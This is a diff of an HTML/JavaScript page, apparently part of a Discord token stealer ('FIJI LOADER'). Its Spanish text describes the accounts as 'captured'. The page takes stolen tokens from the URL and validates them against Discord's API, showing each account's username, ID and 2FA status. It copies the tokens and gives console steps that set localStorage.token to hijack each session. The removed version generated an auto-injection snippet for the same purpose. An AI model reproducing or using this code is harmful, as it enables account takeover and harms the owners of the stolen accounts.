@@ -1,114 +1,74 @@
 <!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
+<html lang="es"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Token Login</title>
+<title>FIJI · login</title>
 <style>
-  :root{--bg:#0a0c11;--card:#12151d;--acc:#5865f2;--ok:#3ba55d;--bad:#ed4245;--txt:#e8eaf2;--mut:#7d8494}
-  *{box-sizing:border-box}
-  body{margin:0;padding:28px;background:var(--bg);color:var(--txt);
-       font:14px/1.5 "Segoe UI",system-ui,sans-serif}
-  h1{font-size:15px;letter-spacing:.12em;text-transform:uppercase;color:var(--mut);
-     margin:0 0 18px;font-weight:700}
-  .card{background:var(--card);border-radius:10px;padding:14px;margin-bottom:10px}
-  .who{font-weight:700}
-  .st{font-size:12px;color:var(--mut);margin:3px 0 8px}
-  .st.ok{color:var(--ok)} .st.bad{color:var(--bad)}
-  .tok{font:11px/1.4 Consolas,monospace;color:var(--mut);word-break:break-all;margin:0 0 12px}
-  .row{display:flex;gap:8px}
-  button{flex:1;border:0;border-radius:8px;padding:11px;font:600 12px "Segoe UI",sans-serif;
-         cursor:pointer;color:#fff;background:#1a1e28;transition:.15s}
-  button:hover{filter:brightness(1.25)}
-  button:disabled{opacity:.4;cursor:not-allowed}
-  .go{background:var(--ok)}
-  .done{background:var(--acc)}
-  .hint{color:var(--mut);font-size:12px;margin-top:16px;line-height:1.6}
-  code{background:#1a1e28;padding:1px 5px;border-radius:4px;color:#b9c0d0}
-</style>
-</head>
-<body>
-<h1>Token Login</h1>
+:root{--a:#5865f2;--bg:#0a0c11;--c:#12151d;--t:#e8eaf2;--m:#7d8494}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--t);
+font:14px/1.5 system-ui,Segoe UI,sans-serif;padding:28px}
+h1{font-size:17px;margin:0 0 4px}
+p.sub{margin:0 0 22px;color:var(--m);font-size:12px}
+.card{background:var(--c);border:1px solid #1d222d;border-radius:12px;
+padding:16px;margin-bottom:12px}
+.top{display:flex;gap:12px;align-items:center;margin-bottom:10px}
+.av{width:44px;height:44px;border-radius:50%;background:#1d222d;object-fit:cover}
+.name{font-weight:600}
+.id{color:var(--m);font-size:11px;font-family:ui-monospace,Consolas,monospace}
+.tok{width:100%;background:#0d1017;border:1px solid #1d222d;border-radius:8px;
+color:#9aa0b0;font:11px/1.4 ui-monospace,Consolas,monospace;padding:8px;resize:vertical}
+.row{display:flex;gap:8px;margin-top:8px}
+button{flex:1;border:0;border-radius:8px;padding:9px;font-weight:600;
+font-size:12px;cursor:pointer;background:#1a1e28;color:#9aa0b0}
+button.p{background:var(--a);color:#fff}
+button:hover{filter:brightness(1.15)}
+.note{color:var(--m);font-size:11px;margin-top:18px}
+code{background:#0d1017;padding:1px 5px;border-radius:4px;color:#c7cbd6}
+</style></head><body>
+<h1>FIJI LOADER · session</h1>
+<p class="sub">Cuentas capturadas. Copia el token o abre Discord.</p>
 <div id="list"></div>
-<p class="hint">Cada token se valida contra Discord al abrir la página. Los que dan
-<code>401</code> están revocados. Después de abrir Discord: <code>F12</code> →
-pestaña <b>Console</b> → <code>Ctrl+V</code> → <code>Enter</code>.</p>
-
+<p class="note">Si el botón no inicia sesión: abre <code>discord.com/app</code>,
+pulsa <code>Ctrl+Shift+I</code> → Console, pega
+<code>localStorage.token=JSON.stringify("TOKEN")</code> y recarga.</p>
 <script>
-const toks = (new URLSearchParams(location.search).get("t") || "")
-  .split(",").map(s => s.trim()).filter(Boolean);
-
-const snip = t => {
-  const q = JSON.stringify(t);
-  return "(function(){const t=" + JSON.stringify(q) + ";" +
-    "const w=function(){try{localStorage.setItem('token',t)}catch(e){}};" +
-    "w();const i=setInterval(w,50);setTimeout(function(){clearInterval(i);" +
-    "location.href='https://discord.com/channels/@me'},1400)})()";
-};
-
-const copy = async t => {
-  try { await navigator.clipboard.writeText(snip(t)); return true; }
-  catch { return false; }
-};
-
-const check = async t => {
-  try {
-    const r = await fetch("https://discord.com/api/v9/users/@me",
-                          { headers: { Authorization: t } });
-    if (r.status === 200) {
-      const u = await r.json();
-      return { ok: true, label: (u.username || "?") + "#" + (u.discriminator || "0") };
-    }
-    return { ok: false, label: r.status === 401 ? "revoked / invalid (401)"
-                                                : "error " + r.status };
-  } catch { return { ok: false, label: "network error" }; }
-};
-
+const base = "https://discord.com/api/v9";
 const list = document.getElementById("list");
-
-if (!toks.length) {
-  list.innerHTML = '<div class="card">No token in the URL. Expected <code>?t=TOKEN</code>.</div>';
-} else {
-  toks.forEach((t, i) => {
-    const card = document.createElement("div");
-    card.className = "card";
-    const who = document.createElement("div");
-    who.className = "who";
-    who.textContent = toks.length > 1 ? "Account #" + (i + 1) : "Account";
-    const st = document.createElement("div");
-    st.className = "st";
-    st.textContent = "checking...";
-    const tok = document.createElement("div");
-    tok.className = "tok";
-    tok.textContent = t.slice(0, 26) + "..." + t.slice(-10);
-    const row = document.createElement("div");
-    row.className = "row";
-
-    const cp = document.createElement("button");
-    cp.textContent = "COPY SNIPPET";
-    cp.onclick = async () => {
-      cp.textContent = (await copy(t)) ? "COPIED ✓" : "COPY FAILED";
-      cp.className = "done";
-    };
-
-    const go = document.createElement("button");
-    go.className = "go";
-    go.textContent = "OPEN DISCORD";
-    go.disabled = true;
-    go.onclick = async () => { await copy(t); window.open("https://discord.com/login", "_blank"); };
-
-    row.append(cp, go);
-    card.append(who, st, tok, row);
-    list.append(card);
-
-    check(t).then(r => {
-      st.textContent = r.ok ? "✓ live — " + r.label : "✗ " + r.label;
-      st.className = "st " + (r.ok ? "ok" : "bad");
-      go.disabled = !r.ok;
-      if (r.ok && i === toks.findIndex(x => x === t)) copy(t);
-    });
-  });
-}
-</script>
-</body>
-</html>
+const qs = new URLSearchParams(location.search);
+const many = qs.getAll("t").filter(Boolean);
+const one = qs.get("t");
+const toks = many.length ? many : (one ? [one] : []);
+if (!toks.length) list.innerHTML =
+  '<div class="card">Sin token. Usa <code>?t=TOKEN</code>.</div>';
+toks.forEach((t, i) => {
+  const c = document.createElement("div");
+  c.className = "card";
+  c.innerHTML = `<div class="top"><img class="av" alt="">
+    <div><div class="name">Cuenta ${i + 1}</div>
+    <div class="id">cargando…</div></div></div>
+    <textarea class="tok" rows="3" readonly></textarea>
+    <div class="row"><button class="cp">Copiar token</button>
+    <button class="p op">Abrir Discord</button></div>`;
+  const ta = c.querySelector(".tok"); ta.value = t;
+  c.querySelector(".cp").onclick = () => {
+    navigator.clipboard.writeText(t);
+    c.querySelector(".cp").textContent = "Copiado";
+    setTimeout(() => c.querySelector(".cp").textContent = "Copiar token", 1400);
+  };
+  c.querySelector(".op").onclick = () => {
+    navigator.clipboard.writeText(t);
+    window.open("https://discord.com/channels/@me", "_blank");
+  };
+  list.appendChild(c);
+  fetch(base + "/users/@me", {headers: {Authorization: t}})
+    .then(r => r.ok ? r.json() : null)
+    .then(u => {
+      if (!u) { c.querySelector(".id").textContent = "token muerto"; return; }
+      c.querySelector(".name").textContent = u.global_name || u.username;
+      c.querySelector(".id").textContent =
+        u.username + " · " + u.id + (u.mfa_enabled ? " · 2fa" : "");
+      if (u.avatar) c.querySelector(".av").src =
+        `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png?size=64`;
+    }).catch(() => c.querySelector(".id").textContent = "sin conexión");
+});
+</script></body></html>
